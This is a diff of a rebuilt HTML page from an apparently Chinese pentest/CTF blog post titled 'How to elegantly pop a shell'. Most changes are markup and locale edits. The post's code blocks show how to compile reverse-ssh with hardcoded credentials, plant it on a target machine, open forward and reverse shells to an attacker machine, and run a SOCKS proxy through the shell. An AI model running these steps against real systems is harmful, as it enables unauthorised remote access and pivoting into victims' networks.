@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en-us" dir="ltr">
+<html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='不能ssh? 那就暴力出奇迹--强行ssh'><title>论如何优雅地弹Shell</title>
 
@@ -366,38 +366,38 @@
 <p>为什么要先编译?</p>
 <p>—为了能够防止其他人偷家，我们需要自定义连接用户名密码</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#先clone</span>
-git clone https://github.com/Fahrj/reverse-ssh.git
-<span class="c1"># 设置一些环境变量</span>
-<span class="c1">#选喜欢的shell</span>
-<span class="nb">export</span> <span class="nv">RS_SHELL</span><span class="o">=</span><span class="s2">&#34;/bin/bash&#34;</span>
-<span class="c1">#设置用户名</span>
-<span class="nb">export</span> <span class="nv">LUSER</span><span class="o">=</span><span class="s2">&#34;root&#34;</span>
-<span class="c1">#设置密码</span>
-<span class="nb">export</span> <span class="nv">RS_PASS</span><span class="o">=</span><span class="s2">&#34;nanonanoda&#34;</span>
-<span class="c1">#编译</span>
-make
-</code></pre></div><p>之后将<code>reverse-ssh/bin</code> 下对应文件上传至目标机器即可</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#先clone</span>
+</span></span><span class="line"><span class="cl">git clone https://github.com/Fahrj/reverse-ssh.git
+</span></span><span class="line"><span class="cl"><span class="c1"># 设置一些环境变量</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#选喜欢的shell</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">RS_SHELL</span><span class="o">=</span><span class="s2">&#34;/bin/bash&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#设置用户名</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">LUSER</span><span class="o">=</span><span class="s2">&#34;root&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#设置密码</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">RS_PASS</span><span class="o">=</span><span class="s2">&#34;nanonanoda&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#编译</span>
+</span></span><span class="line"><span class="cl">make
+</span></span></code></pre></div><p>之后将<code>reverse-ssh/bin</code> 下对应文件上传至目标机器即可</p>
 <h3 id="get正向shell">Get正向Shell</h3>
 <h4 id="目标机器上">目标机器上</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./reverse-sshx64 -v -l -p 设置一个端口
-</code></pre></div><h4 id="攻击者机器上">攻击者机器上</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh 编译时设置的用户名@目标ip -p 之前设置的端口
-</code></pre></div><h3 id="get反向shell">Get反向Shell</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./reverse-sshx64 -v -l -p 设置一个端口
+</span></span></code></pre></div><h4 id="攻击者机器上">攻击者机器上</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh 编译时设置的用户名@目标ip -p 之前设置的端口
+</span></span></code></pre></div><h3 id="get反向shell">Get反向Shell</h3>
 <h4 id="step1-在攻击机器上起监听">Step1: 在攻击机器上起监听</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#攻击机器上运行</span>
-./reverse-ssh -v -l -p 监听端口
-</code></pre></div><h4 id="step2让目标来连接">Step2:让目标来连接</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#目标机器上运行</span>
-./reverse-ssh -v -l -p 攻击机器监听的端口 -b ssh服务在攻击机器上启动的端口 
-</code></pre></div><h4 id="step3享受你的ssh连接吧qwq">Step3:享受你的ssh连接吧.qwq.</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#攻击机器上运行</span>
-ssh -p step2中-b参数后面的参数 编译时设置的用户名@127.0.0.1 
-<span class="c1">#密码也是编译时设置的</span>
-</code></pre></div><h3 id="补充让shell变成socks代理">补充:让Shell变成SOCKS代理</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#攻击机器上运行</span>
+</span></span><span class="line"><span class="cl">./reverse-ssh -v -l -p 监听端口
+</span></span></code></pre></div><h4 id="step2让目标来连接">Step2:让目标来连接</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#目标机器上运行</span>
+</span></span><span class="line"><span class="cl">./reverse-ssh -v -l -p 攻击机器监听的端口 -b ssh服务在攻击机器上启动的端口 
+</span></span></code></pre></div><h4 id="step3享受你的ssh连接吧qwq">Step3:享受你的ssh连接吧.qwq.</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#攻击机器上运行</span>
+</span></span><span class="line"><span class="cl">ssh -p step2中-b参数后面的参数 编译时设置的用户名@127.0.0.1 
+</span></span><span class="line"><span class="cl"><span class="c1">#密码也是编译时设置的</span>
+</span></span></code></pre></div><h3 id="补充让shell变成socks代理">补充:让Shell变成SOCKS代理</h3>
 <p>如果想让你的shell成为一个SOCKS代理的话,在攻击机器上运行</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -4 -p Shell的端口 -D 代理的端口 编译时设置的用户名@目标ip 
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -4 -p Shell的端口 -D 代理的端口 编译时设置的用户名@目标ip 
+</span></span></code></pre></div>
 </section>
 
 
@@ -535,11 +535,11 @@ ssh -p step2中-b参数后面的参数 编译时设置的用户名@127.0.0.1
             
                 
 <article class="has-image">
-    <a href="/zh-cn/p/pwn-pwn-pang-part6-rop/">
+    <a href="/zh-cn/p/pwn-pwn-pang-part6---rop/">
         
         
             <div class="article-image">
-                <img src="/zh-cn/p/pwn-pwn-pang-part6-rop/cover.9ce3629f5f54def41971d23600c4a453_hu76ffa02a199d8318bcf8bc7fd89975bb_336695_250x150_fill_q75_box_smart1.jpg" 
+                <img src="/zh-cn/p/pwn-pwn-pang-part6---rop/cover.9ce3629f5f54def41971d23600c4a453_hu76ffa02a199d8318bcf8bc7fd89975bb_336695_250x150_fill_q75_box_smart1.jpg" 
                         width="250" 
                         height="150" 
                         loading="lazy"
